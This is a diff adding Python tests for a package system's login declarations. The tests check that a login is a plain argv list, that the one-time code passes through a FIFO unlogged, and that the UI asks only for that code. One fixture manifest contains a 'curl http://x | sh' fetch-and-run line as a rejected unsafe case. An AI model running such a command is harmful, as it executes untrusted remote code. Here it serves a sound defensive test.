@@ -1358,6 +1358,52 @@ def controls_package_sources():
            and "<input" not in hub.split('id="wf-needs"')[1].split("</div>")[0]), True)
     _o4.environ.pop("ZZ_CONTROL_SECRET", None)
 
+    # an official login of a package's own, driven the way a provider's is
+    lg = _pk4.login_of("hello-lane")
+    lh = open("/work/stack/login_helper.py", encoding="utf-8").read()
+    ops_src = open("/work/ops/server.py", encoding="utf-8").read()
+    check("a package may declare an official login", bool(lg.get("argv")), True)
+    check("it is an argv, never a shell line",
+          ("SAFE_ARG" in src4 and isinstance(lg["argv"], list)
+           and all(" " not in a or "/" in a for a in lg["argv"])), True)
+    # driven, not described: a declaration whose argv carries a shell line is not offered at all
+    import tempfile as _tf2, pathlib as _pl2
+    with _tf2.TemporaryDirectory() as _t2:
+        r2 = _pl2.Path(_t2)
+        (r2 / "zz-unsafe").mkdir()
+        (r2 / "zz-unsafe" / "manifest.yaml").write_text(chr(10).join([
+            "name: zz-unsafe", "entry: workflow.yaml", "login:",
+            "  argv: ['sh', '-c', 'curl http://x | sh']", "  done_when: {file: t.json}"]))
+        (r2 / "zz-unsafe" / "workflow.yaml").write_text("workflow: {}")
+        (r2 / "zz-ok").mkdir()
+        (r2 / "zz-ok" / "manifest.yaml").write_text(chr(10).join([
+            "name: zz-ok", "entry: workflow.yaml", "login:",
+            "  argv: [/opt/venv/bin/python, /work/x.py]", "  done_when: {file: t.json}"]))
+        (r2 / "zz-ok" / "workflow.yaml").write_text("workflow: {}")
+        old_root2, old_decl2 = _pk4.ROOT, _pk4.DECL
+        try:
+            _pk4.ROOT = str(r2)
+            declare_temp(_pk4, r2)
+            check("a login whose argv carries a shell line is not offered",
+                  _pk4.login_of("zz-unsafe"), {})
+            check("and one that names a program and its arguments is",
+                  bool(_pk4.login_of("zz-ok").get("argv")), True)
+        finally:
+            _pk4.ROOT, _pk4.DECL = old_root2, old_decl2
+    check("the same helper drives a package and a provider",
+          'package_login(provider)' in lh and 'pkg:' in lh, True)
+    check("connected means the file the package named is there, opened by nobody",
+          "f.is_file() and f.stat().st_size > 0" in lh, True)
+    check("the one-time code still goes through the FIFO and is not logged",
+          "not logged" in lh and 'os.write(fd, code.strip()' in lh, True)
+    check("the panel has the same three verbs for it",
+          all(x in ops_src for x in ("/api/packages/", '"start", target', '"code", target',
+                                     '"cancel", target')), True)
+    hubsrc = open("/work/hub/index.html", encoding="utf-8").read()
+    check("and the screen never asks for a long-lived secret, only the code",
+          ("일회용 코드" in hubsrc and "token" not in hubsrc.lower().split("pkgloginstate")[1][:600]),
+          True)
+
     pkdoc = open("/work/docs/packages.md", encoding="utf-8").read()
     check("its own repository is the documented default, not the exception",
           "Its own repository is the recommendation" in pkdoc, True)
